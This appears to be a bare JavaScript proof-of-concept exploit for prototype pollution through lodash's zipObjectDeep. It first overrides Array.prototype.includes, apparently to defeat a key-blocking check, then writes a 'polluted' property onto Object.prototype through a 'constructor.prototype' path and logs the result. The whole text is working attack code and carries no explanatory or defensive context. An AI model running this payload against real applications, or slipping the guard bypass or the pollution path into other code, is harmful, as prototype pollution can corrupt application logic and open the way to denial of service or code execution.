Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const _ = require('lodash');
_.zipObjectDeep(['constructor.prototype.polluted'], ['yes']);
console.log({}.polluted);